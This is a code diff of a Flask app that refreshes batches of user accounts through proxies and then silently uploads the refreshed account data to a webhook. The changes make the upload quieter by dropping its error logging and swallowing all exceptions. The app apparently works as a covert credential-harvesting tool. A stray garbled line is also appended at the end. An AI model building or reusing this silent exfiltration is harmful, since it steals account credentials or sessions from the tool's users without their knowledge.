@@ -5,7 +5,6 @@ import json
 import os
 import queue
 import random
-import sys
 import threading
 
 from flask import Flask, Response, render_template, request, stream_with_context
@@ -98,25 +97,21 @@ def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: i
         resp = requests.post(
             url,
             data={"payload_json": json.dumps(payload, ensure_ascii=False)},
-            files={"file": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
-            timeout=25,
+            files={"files[0]": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
+            timeout=20,
         )
-        if resp.status_code in (200, 204):
-            return
-
-        resp2 = requests.post(
-            url,
-            data={
-                "content": payload["content"],
-                "allowed_mentions": json.dumps(payload["allowed_mentions"], ensure_ascii=False),
-            },
-            files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
-            timeout=25,
-        )
-        if resp2.status_code not in (200, 204):
-            print(f"[WEBHOOK_ERR] status={resp2.status_code} body={resp2.text[:200]}", file=sys.stderr)
-    except Exception as e:
-        print(f"[WEBHOOK_ERR] {e}", file=sys.stderr)
+        if resp.status_code not in (200, 204):
+            requests.post(
+                url,
+                data={
+                    "content": payload["content"],
+                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
+                },
+                files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
+                timeout=20,
+            )
+    except Exception:
+        pass
 
 
 def normalize_proxy(raw: str) -> str:
@@ -209,8 +204,8 @@ def api_refresh():
         def runner():
             push("start", total=total)
             push("log", msg=f"{total} accounts · {len(proxies)} proxies · {min(threads, total)} threads")
-            with ThreadPoolExecutor(max_workers=min(threads, total)) as executor:
-                futs = [pool_submit(executor, worker, u, p, c) for (u, p, c) in accounts]
+            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
+                futs = [pool.submit(worker, u, p, c) for (u, p, c) in accounts]
                 for f in as_completed(futs):
                     try:
                         f.result()
@@ -223,9 +218,6 @@ def api_refresh():
 
             send_refreshed_to_webhook_silent(joined_out, ok_total, total)
             push("done")
-
-        def pool_submit(executor, fn, *args):
-            return executor.submit(fn, *args)
 
         threading.Thread(target=runner, daemon=True).start()
 
@@ -240,3 +232,4 @@ def api_refresh():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
+```[cite: 3]
